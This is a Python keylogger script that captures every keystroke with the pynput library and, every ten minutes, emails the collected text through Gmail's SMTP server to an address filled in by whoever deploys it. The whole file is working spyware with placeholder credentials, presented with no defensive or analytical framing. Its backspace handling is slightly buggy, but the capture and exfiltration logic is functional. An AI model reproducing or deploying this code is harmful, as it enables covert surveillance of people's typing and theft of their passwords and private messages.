from pynput.keyboard import Key, Listener
from threading import Thread
from time import sleep
import smtplib

target_char=""


def listen(key):
    global target_char
    try:
        if Key==Key.backspace:
            target_char = target_char[:-1]
        elif key==Key.space:
            target_char += " "
        else:
         target_char+= key.char
    except Exception:
        pass
def send():
    global target_char
    sender_mail="youremail" #your email
    recv_mail="youremail" #your emeil
    sender_password = "apppassword" #your app password 
    server=smtplib.SMTP_SSL("smtp.gmail.com", 465)
    server.login(sender_mail, sender_password)
    
    
    
    print("succesfully login")
    while True:
        temp_value=target_char
        target_char=""
        if temp_value== '':
            pass
        else:
            server.sendmail(sender_mail, recv_mail , temp_value)
            print("data sended to xspy")
        sleep(600) #wait
Thread= Thread(target=send)
Thread.start()
with Listener(on_press=listen)as key_listener:
    key_listener.join()